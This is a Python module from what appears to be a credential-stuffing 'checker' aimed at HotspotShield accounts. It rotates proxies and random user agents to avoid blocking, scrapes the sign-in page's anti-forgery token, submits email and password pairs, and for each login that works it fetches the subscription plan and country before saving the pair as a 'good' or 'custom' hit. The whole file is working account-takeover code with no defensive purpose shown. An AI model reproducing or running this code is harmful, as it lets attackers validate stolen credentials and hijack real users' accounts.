from modules.variables import Checker
from modules.functions import bad_proxy, get_random_ua, log, save, set_proxy, return_proxy
from requests import Session
import functools
from requests.adapters import HTTPAdapter, Retry

def check(email:str,password:str):
    while not Checker.stopping:
        try:
            with Session() as s:
                proxy = set_proxy()
                proxy_set = set_proxy(proxy)

                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                user_agent = get_random_ua()
                
                headers = {'User-Agent':user_agent}
                r = s.get('https://account.hotspotshield.com/sign-in',headers=headers)
                vxs_token = r.text.split('vxsftok: \'')[1].split('\'')[0]

                headers = {'User-Agent':user_agent,'Content-Type':'application/x-www-form-urlencoded'}
                data = {'login':email,'pwd':password,'remember':0,'ajax':True,'vxsftok':vxs_token}
                r = s.post('https://account.hotspotshield.com/sign-in',headers=headers,data=data)
                if "Password is required!" in r.text or "Wrong login info. Try again." in r.text or "{\"result\":0," in r.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                if 'user_status' not in r.cookies or "{\"result\":1," not in r.text:
                    raise

                headers = {
                    'User-Agent':user_agent,
                    "Accept-Language": "en-US,en;q=0.9",
                    "Referer": "https://hotspotshield.aura.com/sign-in"
                }
                r = s.get('https://hotspotshield.aura.com/api/user/info',headers=headers)
                plan = r.json()['data']['membership']['plan']
                country = r.json()['data']['country']
                if plan.lower() == 'basic':
                    if not Checker.cui: log("custom",":".join([email,password]),"HotspotShield")
                    save("HotspotShield","custom",Checker.time,":".join([email,password]))
                    Checker.custom += 1
                    return_proxy(proxy)
                    return

                if not Checker.cui: log("good",':'.join([email,password]),"HotspotShield")
                save("HotspotShield","good",Checker.time,':'.join([email,password])+f" | Plan: {plan} | Country: {country}")
                Checker.good += 1
                return_proxy(proxy)
                return

        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1
        
        